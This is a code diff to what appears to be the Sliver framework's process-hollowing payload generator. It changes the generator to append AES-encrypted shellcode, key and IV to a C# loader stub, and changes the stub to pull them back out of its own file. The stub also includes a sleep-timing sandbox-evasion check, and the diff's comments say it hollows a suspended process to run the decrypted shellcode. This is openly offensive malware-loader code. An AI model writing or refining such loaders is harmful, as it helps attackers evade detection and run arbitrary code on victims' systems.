@@ -930,11 +930,18 @@ func (s *Sliver) ProcessHollowPayload(opts GenerateOptions) ([]byte, []byte, []b
 		return nil, nil, nil, nil, fmt.Errorf("failed to compile C# code: %w", err)
 	}
 
-	return executable, encryption.Encrypted, encryption.Key, encryption.IV, nil
+	// Create self-extracting executable with embedded payload
+	combined := append(executable, byte(0x50), byte(0x48), byte(0x4F), byte(0x4C)) // PHOL marker
+	payloadLen := int32(len(encryption.Encrypted))
+	combined = append(combined, byte(payloadLen), byte(payloadLen>>8), byte(payloadLen>>16), byte(payloadLen>>24))
+	combined = append(combined, encryption.Encrypted...)
+	combined = append(combined, encryption.Key...)
+	combined = append(combined, encryption.IV...)
+
+	return combined, nil, nil, nil, nil
 }
 
-// buildProcessHollowCS builds a C# stub with embedded encrypted payload.
-// buildProcessHollowCS builds a C# stub with embedded encrypted payload.
+// buildProcessHollowCS builds a C# stub that extracts encrypted payload from itself.
 func buildProcessHollowCS() []byte {
 	return []byte(`using System;
 using System.IO;
@@ -945,8 +952,9 @@ namespace ph
 {
     public class Program
     {
-        public const uint CREATE_SUSPENDED = 0x4;
-        public const int PROCESSBASICINFORMATION = 0;
+        private const uint CREATE_SUSPENDED = 0x4;
+        private const int PROCESSBASICINFORMATION = 0;
+        private const int MARKER = 0x50484F4C;
 
         [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
         public struct ProcessInfo
@@ -1013,6 +1021,41 @@ namespace ph
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern uint ResumeThread(IntPtr hThread);
 
+        static bool ExtractEmbedded(byte[] exeData, out byte[] payload, out byte[] key, out byte[] iv)
+        {
+            payload = null;
+            key = null;
+            iv = null;
+            try
+            {
+                byte[] marker = BitConverter.GetBytes(MARKER);
+                int markerIdx = -1;
+                for (int i = 0; i < exeData.Length - 12; i++)
+                {
+                    if (exeData[i] == marker[0] && exeData[i+1] == marker[1] &&
+                        exeData[i+2] == marker[2] && exeData[i+3] == marker[3])
+                    {
+                        markerIdx = i;
+                        break;
+                    }
+                }
+                if (markerIdx < 0) return false;
+                int pos = markerIdx + 4;
+                int payloadLen = BitConverter.ToInt32(exeData, pos);
+                pos += 4;
+                payload = new byte[payloadLen];
+                Array.Copy(exeData, pos, payload, 0, payloadLen);
+                pos += payloadLen;
+                key = new byte[32];
+                Array.Copy(exeData, pos, key, 0, 32);
+                pos += 32;
+                iv = new byte[16];
+                Array.Copy(exeData, pos, iv, 0, 16);
+                return true;
+            }
+            catch { return false; }
+        }
+
         static byte[] DecryptAES(byte[] ciphertext, byte[] key, byte[] iv)
         {
             using (Aes aes = Aes.Create())
@@ -1037,11 +1080,10 @@ namespace ph
                 double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
                 if (deltaT < 9.5) return;
 
-                string dir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
-                byte[] buf = File.ReadAllBytes(Path.Combine(dir, "payload.bin"));
-                byte[] key = File.ReadAllBytes(Path.Combine(dir, "key.bin"));
-                byte[] iv = File.ReadAllBytes(Path.Combine(dir, "iv.bin"));
-
+                string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+                byte[] exeData = File.ReadAllBytes(exePath);
+                byte[] buf, key, iv;
+                if (!ExtractEmbedded(exeData, out buf, out key, out iv)) return;
                 byte[] shellcode = DecryptAES(buf, key, iv);
 
                 StartupInfo sInfo = new StartupInfo();
